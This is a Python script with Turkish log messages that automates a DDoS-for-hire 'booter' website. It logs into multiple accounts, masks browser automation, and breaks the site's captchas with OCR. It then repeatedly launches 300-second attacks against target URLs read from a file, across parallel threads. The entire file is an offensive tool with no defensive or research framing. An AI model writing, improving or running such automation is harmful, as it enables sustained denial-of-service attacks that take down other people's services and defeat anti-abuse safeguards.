import threading
import time
import os
import re
import base64
import io
import shutil
import sys
import logging
from datetime import datetime
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
from PIL import Image
import ddddocr
import traceback

# Log klasörü
LOG_DIR = "logs"
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

log_filename = f"{LOG_DIR}/ddos_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(log_filename, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

error_log_filename = f"{LOG_DIR}/error_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
error_handler = logging.FileHandler(error_log_filename, encoding='utf-8')
error_handler.setLevel(logging.ERROR)
error_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
logger.addHandler(error_handler)

ocr = ddddocr.DdddOcr()

class DDoSNowManager:
    def __init__(self):
        self.base_url = "https://ipbooter.ba"
        self.accounts = self.load_accounts()
        self.running_states = {}
        self.stop_events = {}
        self.active_threads = {}
        logger.info(f"=== PROGRAM BAŞLADI ===")
        logger.info(f"Site: {self.base_url}")
        logger.info(f"Log dosyası: {log_filename}")

    def load_accounts(self):
        accounts = []
        if not os.path.exists("accounts.txt"):
            with open("accounts.txt", "w") as f:
                f.write("test:pass:https://example.com\n")
            logger.warning("accounts.txt oluşturuldu!")
            return []
        with open("accounts.txt", "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    p = line.split(":")
                    if len(p) >= 3:
                        accounts.append({"id": str(len(accounts)+1), "user": p[0], "pass": p[1], "target": p[2]})
                        logger.info(f"Hesap yüklendi: {p[0]} -> {p[2]}")
        return accounts

    def solve_captcha(self, page, username):
        try:
            logger.info(f"[{username}] Deploy butonu aranıyor...")
            
            # Deploy butonunu bul
            deploy_btn = page.locator("button.btn-confirm:has-text('Deploy Attack')").first
            if deploy_btn.count() == 0:
                deploy_btn = page.locator("button:has-text('Deploy Attack')").first
            if deploy_btn.count() == 0:
                logger.error(f"[{username}] Deploy butonu bulunamadı!")
                return False
                
            deploy_btn.click()
            logger.info(f"[{username}] Deploy butonuna tıklandı")
            time.sleep(3)

            attempt = 0
            while True:
                attempt += 1
                try:
                    logger.info(f"[{username}] Captcha çözüm denemesi #{attempt}")
                    
                    img_elem = page.locator("img[alt='captcha']").first
                    if img_elem.count() == 0:
                        time.sleep(2)
                        continue
                        
                    img_src = img_elem.get_attribute("src")
                    if not img_src or not img_src.startswith("data:image"):
                        time.sleep(2)
                        continue

                    base64_data = re.sub(r'^data:image/\w+;base64,', '', img_src)
                    img_bytes = base64.b64decode(base64_data)
                    img = Image.open(io.BytesIO(img_bytes))

                    captcha_text = ocr.classification(img)
                    captcha_text = re.sub(r'[^A-Z0-9]', '', captcha_text.upper())

                    if not captcha_text:
                        time.sleep(1)
                        continue

                    logger.info(f"[{username}] OCR sonucu: {captcha_text}")

                    captcha_input = page.locator("input[name='captcha']").first
                    if captcha_input.count() == 0:
                        logger.error(f"[{username}] Captcha input bulunamadı!")
                        return False
                        
                    captcha_input.fill("")
                    captcha_input.fill(captcha_text)
                    time.sleep(1)

                    deploy_btn2 = page.locator("button[type='submit'][form='hubForm']").first
                    if deploy_btn2.count() == 0:
                        deploy_btn2 = page.locator("button.btn-confirm:has-text('Deploy Attack')").last
                    if deploy_btn2.count() == 0:
                        logger.error(f"[{username}] Deploy butonu bulunamadı!")
                        return False
                        
                    deploy_btn2.click()
                    time.sleep(3)

                    if page.locator("text=Invalid captcha code").count() > 0:
                        logger.warning(f"[{username}] Yanlış captcha: {captcha_text}")
                        captcha_input.fill("")
                        time.sleep(1)
                        continue
                    else:
                        logger.info(f"[{username}] Attack başlatıldı!")
                        return True
                        
                except Exception as e:
                    logger.error(f"[{username}] Captcha hatası (deneme {attempt}): {e}")
                    time.sleep(2)
                    continue
                    
        except Exception as e:
            logger.error(f"[{username}] solve_captcha genel hata: {e}")
            return False

    def browser_worker(self, acc_id, target_url, account_data):
        username = account_data["user"]
        password = account_data["pass"]
        profile_dir = os.path.join(os.getcwd(), f"profiles/profile_{username}")
        stop_event = self.stop_events.get(acc_id)
        
        logger.info(f"[{username}] Worker başlatıldı - Hedef: {target_url}")

        while self.running_states.get(acc_id, False):
            try:
                if os.path.exists(profile_dir):
                    try:
                        shutil.rmtree(profile_dir)
                    except:
                        pass
                os.makedirs(profile_dir, exist_ok=True)

                with sync_playwright() as p:
                    context = p.chromium.launch_persistent_context(
                        user_data_dir=profile_dir,
                        headless=True,
                        args=['--no-sandbox', '--disable-setuid-sandbox'],
                        viewport={"width": 1280, "height": 720},
                        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                    )
                    page = context.new_page()
                    page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined});")

                    # GİRİŞ - ipbooter.ba
                    try:
                        logger.info(f"[{username}] Giriş sayfasına gidiliyor...")
                        page.goto(f"{self.base_url}/login", timeout=60000)
                        page.wait_for_load_state("networkidle", timeout=30000)
                        time.sleep(5)
                        
                        # Login formu
                        logger.info(f"[{username}] Login formu dolduruluyor...")
                        
                        page.fill("input[name='username']", username, timeout=30000)
                        logger.info(f"[{username}] Username dolduruldu")
                        
                        page.fill("input[name='password']", password, timeout=30000)
                        logger.info(f"[{username}] Password dolduruldu")
                        
                        page.click("button[type='submit']", timeout=30000)
                        logger.info(f"[{username}] Login butonuna tıklandı")
                        time.sleep(5)
                        
                    except Exception as e:
                        logger.error(f"[{username}] Login hatası: {e}")
                        logger.error(traceback.format_exc())
                        time.sleep(30)
                        continue
                    
                    # "Got it" butonu
                    try:
                        got_it = page.locator("button:has-text('Got it')").first
                        if got_it.count() > 0:
                            got_it.click()
                            logger.info(f"[{username}] 'Got it' butonuna tıklandı")
                            time.sleep(2)
                    except:
                        pass
                    
                    # Hub sayfası
                    try:
                        logger.info(f"[{username}] Hub sayfasına gidiliyor...")
                        page.goto(f"{self.base_url}/hub", timeout=60000)
                        page.wait_for_load_state("networkidle", timeout=30000)
                        time.sleep(5)
                        
                        if "login" in page.url:
                            logger.error(f"[{username}] Giriş başarısız!")
                            time.sleep(30)
                            continue
                        
                        logger.info(f"[{username}] Giriş başarılı!")
                        
                    except Exception as e:
                        logger.error(f"[{username}] Hub sayfası hatası: {e}")
                        time.sleep(30)
                        continue

                    # ANA DÖNGÜ
                    attack_count = 0
                    while self.running_states.get(acc_id, False) and not (stop_event and stop_event.is_set()):
                        try:
                            attack_count += 1
                            logger.info(f"[{username}] Attack #{attack_count} başlatılıyor...")
                            
                            # Hedef URL
                            target_input = page.locator("input[name='hub.0.host']").first
                            if target_input.count() == 0:
                                logger.error(f"[{username}] Hedef URL input bulunamadı!")
                                page.reload()
                                time.sleep(5)
                                continue
                                
                            target_input.fill(target_url, timeout=30000)
                            logger.info(f"[{username}] Hedef URL dolduruldu: {target_url}")
                            
                            # Süre
                            time_input = page.locator("input[id='hub.0.time']").first
                            if time_input.count() == 0:
                                time_input = page.locator("input[name*='time']").first
                            if time_input.count() == 0:
                                logger.error(f"[{username}] Süre input bulunamadı!")
                                page.reload()
                                time.sleep(5)
                                continue
                                
                            time_input.fill("300", timeout=30000)
                            logger.info(f"[{username}] Süre dolduruldu: 300")
                            
                            # CAPTCHA çöz
                            logger.info(f"[{username}] CAPTCHA çözülüyor...")
                            if not self.solve_captcha(page, username):
                                logger.error(f"[{username}] CAPTCHA çözülemedi!")
                                page.reload()
                                time.sleep(5)
                                continue

                            logger.info(f"[{username}] Attack başladı! - {target_url}")
                            
                            # Süre takibi
                            while self.running_states.get(acc_id, False) and not (stop_event and stop_event.is_set()):
                                try:
                                    badge = page.locator(".accordion-button .badge").first
                                    if badge.count() > 0:
                                        time_text = badge.text_content().strip()
                                        logger.info(f"[{username}] Kalan süre: {time_text}")
                                        if time_text in ["0m 0s", "0s"]:
                                            logger.info(f"[{username}] Süre doldu!")
                                            break
                                    else:
                                        running = page.locator(".stats-content .badge:has-text('Running')").first
                                        if running.count() == 0:
                                            logger.info(f"[{username}] Attack bitti!")
                                            break
                                except:
                                    pass
                                time.sleep(5)

                            if not self.running_states.get(acc_id, False):
                                break

                            logger.info(f"[{username}] Yeniden başlatılıyor...")
                            page.reload()
                            time.sleep(5)
                            
                            if "/hub" not in page.url:
                                page.goto(f"{self.base_url}/hub")
                                time.sleep(3)

                        except Exception as inner_e:
                            logger.error(f"[{username}] İşlem hatası (Attack #{attack_count}): {inner_e}")
                            logger.error(traceback.format_exc())
                            page.reload()
                            time.sleep(5)
                            continue

                    context.close()

            except Exception as outer_e:
                logger.error(f"[{username}] KRİTİK HATA: {outer_e}")
                logger.error(traceback.format_exc())
                time.sleep(10)
                continue

        logger.info(f"[{username}] Worker durduruldu")
        self.running_states[acc_id] = False

    def start_all(self):
        if not self.accounts:
            logger.error("Hiç hesap yok!")
            return
            
        logger.info(f"{len(self.accounts)} hesap başlatılıyor...")
        for acc in self.accounts:
            acc_id = acc["id"]
            target = acc.get("target", "https://example.com")
            self.running_states[acc_id] = True
            self.stop_events[acc_id] = threading.Event()
            t = threading.Thread(target=self.browser_worker, args=(acc_id, target, acc), daemon=True)
            self.active_threads[acc_id] = t
            t.start()
            logger.info(f"[{acc['user']}] Başlatıldı -> {target}")
            time.sleep(3)
        
        while True:
            time.sleep(60)
            logger.info("="*50)
            logger.info("AKTİF HESAPLAR:")
            for acc in self.accounts:
                acc_id = acc["id"]
                status = "Çalışıyor" if self.running_states.get(acc_id, False) else "Durduruldu"
                logger.info(f"  {acc['user']}: {status} -> {acc.get('target', '?')}")
            logger.info("="*50)

if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════╗
    ║   IPBOOTER.BA - DDOS AUTOMATION           ║
    ╚═══════════════════════════════════════════╝
    """)
    manager = DDoSNowManager()
    manager.start_all()
